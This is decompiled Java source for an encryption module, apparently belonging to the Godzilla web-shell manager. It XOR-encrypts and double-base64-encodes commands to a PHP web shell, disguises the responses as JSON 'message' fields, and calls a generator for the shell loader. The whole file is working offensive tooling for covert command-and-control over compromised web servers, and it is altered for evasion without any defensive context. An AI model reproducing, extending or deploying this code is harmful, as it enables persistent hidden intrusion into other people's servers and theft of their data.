//
// Source code recreated from a .class file by IntelliJ IDEA
// (powered by FernFlower decompiler)
//

package shells.cryptions.phpXor;
import core.annotation.CryptionAnnotation;
import core.imp.Cryption;
import core.shell.ShellEntity;
import java.io.ByteArrayOutputStream;
import java.io.IOException;
import java.net.URLEncoder;
import java.util.zip.Deflater;
import java.util.zip.Inflater;
import util.Log;
import util.functions;
import util.http.Http;

@CryptionAnnotation(
        Name = "PHP_XOR_BASE64bohemian",
        payloadName = "PhpDynamicPayload"

)
public class Phpxorbase64bohemiana implements Cryption {
    private ShellEntity shell;
    private Http http;
    private byte[] key;
    private boolean state;
    private String pass;
    private byte[] payload;
    private String findStrLeft;
    private String findStrRight;

    public Phpxorbase64bohemiana() {
    }

    public void init(ShellEntity context) {
        this.shell = context;
        this.http = this.shell.getHttp();
        this.key = this.shell.getSecretKeyX().getBytes();
        this.pass = this.shell.getPassword();
        String findStrMd5 = functions.md5(this.pass + new String(this.key));
        //this.findStrLeft = findStrMd5.substring(0, 16);
        //this.findStrRight = findStrMd5.substring(16);
        this.findStrLeft = "{\"message\":\"";
        this.findStrRight = "\"}";

        try {
            this.payload = this.shell.getPayloadModule().getPayload();
            if (this.payload != null) {
                this.http.sendHttpResponse(this.payload);
                this.state = true;
            } else {
                Log.error("payload Is Null");
            }

        } catch (Exception var4) {
            Log.error(var4);
        }
    }

    public byte[] encode(byte[] data) {
        try {
            return this.E(data);
        } catch (Exception var3) {
            Log.error(var3);
            return null;
        }
    }

    public byte[] decode(byte[] data) {
        if (data != null && data.length > 0) {
            try {
                return this.D(this.findStr(data));
            } catch (Exception var3) {
                Log.error(var3);
                return null;
            }
        } else {
            return data;
        }
    }

    public boolean isSendRLData() {
        return true;
    }
    //添加

    public byte[] E(byte[] cs) {
        int len = cs.length;

        for(int i = 0; i < len; ++i) {
            cs[i] ^= this.key[i + 1 & 15];
        }
        byte[] csbase1 = functions.base64EncodeToString(cs).getBytes();


        return (this.pass + "=" + URLEncoder.encode(functions.base64EncodeToString(csbase1))).getBytes();
        //return (this.pass + "=" + URLEncoder.encode(functions.base64EncodeToString(cs))).getBytes();
    }

    public byte[] D(String data) {
        byte[] cs = functions.base64Decode(data);
        int len = cs.length;

        for(int i = 0; i < len; ++i) {
            cs[i] ^= this.key[i + 1 & 15];
        }

        return cs;
    }

    public String findStr(byte[] respResult) {
        String htmlString = new String(respResult);
        //return functions.subMiddleStr(htmlString, this.findStrLeft, this.findStrRight);
        return functions.subMiddleStr(htmlString, this.findStrLeft, this.findStrRight);
    }

    public boolean check() {
        return this.state;
    }

    public byte[] generate(String password, String secretKey) {
        return Generate.GenerateShellLoder(password, functions.md5(secretKey).substring(0, 16), false);
    }
}
